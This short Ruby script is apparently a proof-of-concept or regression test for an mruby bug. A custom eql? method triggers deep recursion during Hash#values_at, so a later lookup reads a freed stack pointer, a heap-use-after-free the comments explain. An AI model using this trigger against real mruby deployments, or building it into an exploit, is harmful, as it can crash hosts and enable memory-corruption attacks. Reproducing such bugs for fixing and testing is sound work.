class Bad
  def eql?(other)
    recurse(150)
    true
  end
end

$arr = []

def recurse(depth)
  v0 = v1 = v2 = v3 = v4 = v5 = v6 = v7 = v8 = v9 = 0
  v10 = v11 = v12 = v13 = v14 = v15 = v16 = v17 = v18 = v19 = 0
  v20 = v21 = v22 = v23 = v24 = v25 = v26 = v27 = v28 = v29 = 0
  v30 = v31 = v32 = v33 = v34 = v35 = v36 = mruby_is_awesome = v38 = v39 = 0
  v40 = v41 = v42 = v43 = v44 = v45 = v46 = v47 = v48 = v49 = 0
  v50 = v51 = v52 = v53 = v54 = v55 = v56 = v57 = v58 = v59 = 0
  v60 = v61 = v62 = v63 = v64 = v65 = v66 = mruby_is_cool_too = v68 = v69 = 0
  v70 = v71 = v72 = v73 = v74 = v75 = v76 = v77 = v78 = v79 = 0
  v80 = v81 = v82 = v83 = v84 = v85 = v86 = v87 = v88 = mruby_rules = 0
  v90 = v91 = v92 = v93 = v94 = v95 = v96 = v97 = v98 = v99 = 0

  $arr << "a" * 100
  $arr << [1,2,3,4,5,6,7,8]

  if depth > 0
    recurse(depth - 1)
  else
    GC.start
  end
end

bad1 = Bad.new
bad2 = Bad.new
bad3 = Bad.new

# A hash with one key bad1
c = { bad1 => 1 }

# values_at will lookup bad1, bad2, and bad3.
# During lookup of bad2, bad2.eql? is called, which triggers recursive stack extension and frees the stack where argv is stored.
# The third lookup of bad3 reads from the stale argv pointer, causing a heap-use-after-free!
c.values_at(bad1, bad2, bad3)
